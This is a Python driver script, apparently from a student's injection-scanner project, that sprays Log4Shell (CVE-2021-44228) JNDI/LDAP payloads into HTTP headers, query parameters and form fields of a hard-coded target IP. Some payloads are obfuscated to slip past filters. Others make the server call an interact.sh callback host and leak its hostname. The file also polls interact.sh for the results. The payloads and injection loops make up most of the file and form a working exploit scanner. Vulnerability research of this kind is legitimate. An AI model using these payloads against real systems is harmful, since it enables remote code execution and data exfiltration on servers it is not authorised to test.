from scanner import RequestOperation
from scanner.CommandHandle import CommandUtil
from generator.PayloadGenerator import PayloadGenerator
from services.InteractShService import InteractSh
from generator.TemplateConfigGenerator import TemplateConfigService
from scanner.RacoonKernel import RacoonKernel
from generator.RequestGenerator import RequestGenerator

#127.0.0.1
#GET /test.html HTTP/1.1
raw_request = """GET /test.html HTTP/1.1
Host: 54.179.181.52:8001
Accept: Accept
Accept-Encoding: Accept-Encoding
Accept-Language: Accept-Language
Access-Control-Request-Headers: Access-Control-Request-Headers
Access-Control-Request-Method: Access-Control-Request-Method
Authentication: Basic Authentication
Authentication: Bearer {{payload2}}
Cookie: Cookie
Location: Location
Origin: Origin
Referer: Referer
Upgrade-Insecure-Requests: Upgrade-Insecure-Requests
User-Agent: {{payload1}}
X-Api-Version: {{payload2}}
X-CSRF-Token: {{payload1}}
X-Druid-Comment: X-Druid-Comment
X-Forwarded-For: X-Forwarded-For
X-Origin: X-Origin"""

# payloads = {
#     "payload1": ['a', 'b', 'c'],
#     "payload2": ['1', '2', '3'],
#     "payload3": ['blue', 'red', 'green']
# }


payloads = {
    "payload1":["""${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
                """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
                """${jndi:ldap://$c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}"""],
    "payload2":["""${jndi:ldap://accept.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",
                """${jndi:ldap://acceptencoding.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}"""],
    "payload3":["""${jndi:ldap://${hostName}.authenticationbasic.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",
                """${jndi:ldap://${hostName}.authenticationbearer.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",]
}

# payloads = {
#     "payload1":["""${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jndi:ldap://$c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}"""],
#     "payload2":["""${jndi:ldap://accept.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",
#                 """${jndi:ldap://acceptencoding.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}"""]
# }

# payloads = {
#     "payload1":["""${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jndi:ldap://$c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}"""]
#     }

headers = {
    "Accept": "Accept",
    "Accept-Encoding": "Accept-Encoding",
    "Accept-Language": "Accept-Language",
    "Access-Control-Request-Headers": "Access-Control-Request-Headers",
    "Access-Control-Request-Method": "Access-Control-Request-Method",
    "Authentication": "Basic Authentication",
    "Authentication": "Bearer {{payload1}}",
    "Cookie": "Cookie",
    "Location": "Location",
    "Origin": "Origin",
    "Referer": "Referer",
    "Upgrade-Insecure-Requests": "Upgrade-Insecure-Requests",
    "User-Agent": "{{payload2}}",
    "X-Api-Version": "{{payload1}}",
    "X-CSRF-Token": "{{payload2}}",
    "X-Druid-Comment": "X-Druid-Comment{{payload3}}",
    "X-Forwarded-For": "X-Forwarded-For",
    "X-Origin": "X-Origin",
    "Content-Type": "application/x-www-form-urlencoded"
    # "Content-Type": "application/json"
}
# body = """user=admin{{payload1}}&pass=123%20{{payload1}}"""
body = """Name=tester{{payload1}}&Tel=098764321&Email=tester%40gmail.com{{payload2}}&Message=message{{payload3}}"""
# body = """{"username": "tester{{payload1}}","password": "123456{{payload1}}"}"""
# body = """{"Name"="tester{{payload2}}","Tel":"098764321{{payload1}}","Email":"tester%40gmail.com{{payload1}}","Message":"message{{payload2}}"}"""
# body = None

params = {
    'name': 'Vans+Blue{{payload1}}',
    'addr': 'xinchao{{payload2}}',
    'phone': 'lalala{{payload3}}'
}
# params = None
url = "http://54.179.181.52:8001/contact"
HTTP_PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


if __name__ == "__main__":
    args = CommandUtil()
    args.argument()
    args.argumentHandling()
    config = TemplateConfigService.getObjTemplateConfigByTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\demo template\addBodyJsonAndQueryToCVE44228.yaml")
    requests = RequestGenerator.generateRequestObject(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\demo template\addBodyJsonAndQueryToCVE44228.yaml")
    # print(requests)
    RacoonKernel.racoonFlowControl(config, requests)
    # data = TemplateConfigService.getObjTemplateConfigByTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\demo template\addBodyJsonAndQueryToCVE44228.yaml")

    # print(data.scanMode)
    # print(data.stopAtFirstMatch)
    # print(data.payload.payloadValue)
    # print(data.thread)
    # print(data.redirect)
    # print(data.cookieReuse)
    # data = TemplateConfigService.getObjTemplateConfigByTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\wordpress-weak-credentials.yaml")
    # print(data.interactShUrl)
    exit()
    interact = InteractSh()
    interact_url = interact.registerInteractShServer()
    print(interact_url)
    input()
    data, aes_key = interact.pollDataFromWeb()
    if aes_key:
        key = interact.decryptAESKey(aes_key)
        dataList = interact.decryptMessage(key, data)
        print(dataList)
    else:
        print("hello")
    exit()
    data = PayloadGenerator.generatePayloadObjFromTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\wordpress-weak-credentials.yaml")
    # print(data.payloadValue)
    print(data)
    exit()
    print(len(data))
    for x in data:
        print(x)
        print("="*60)
    # requestHandle = RequestHandle()
    # print(requestHandle.requestConfig)
    exit()
    headerList = RequestOperation.pitchforkModeDictInjection(payloads, headers)
    paramList = RequestOperation.pitchforkModeDictInjection(payloads, params)
    bodyList = RequestOperation.pitchforkModeStringInjection(payloads, body)
    for header, param, body in zip(headerList, paramList, bodyList):
        RequestOperation.RequestHandle.sendPostRequest(url, param, header, body, HTTP_PROXY)

    exit()
    headerList = RequestOperation.pitchforkModeDictInjection(payloads, headers)
    paramList = RequestOperation.pitchforkModeDictInjection(payloads, params)
    bodyList = RequestOperation.pitchforkModeStringInjection(payloads, body)
    for header, param, body in zip(headerList, paramList, bodyList):
        RequestOperation.RequestHandle.sendPostRequest(header, body, param, url, HTTP_PROXY)

    exit()
    # headers = findAndReplaceInDict(headers, "{{payload1}}", "xinchao")
    # sendGetRequest(headers, body, params, url, HTTP_PROXY)
    headerList = RequestOperation.batteringramModeDictInjection(payloads, headers)
    paramList = RequestOperation.batteringramModeDictInjection(payloads, params)
    bodyList = RequestOperation.batteringramModeStringInjection(payloads, body)
    for header, param, body in zip(headerList, paramList, bodyList):
        # try:
        # sendGetRequest(header, body, param, url, HTTP_PROXY)
        RequestOperation.RequestHandle.sendPostRequest(header, body, param, url, HTTP_PROXY)
        # except:
            # pass
        # print(x)
        # print("="*50)

        # url, params, headers, body, HTTP_PROXY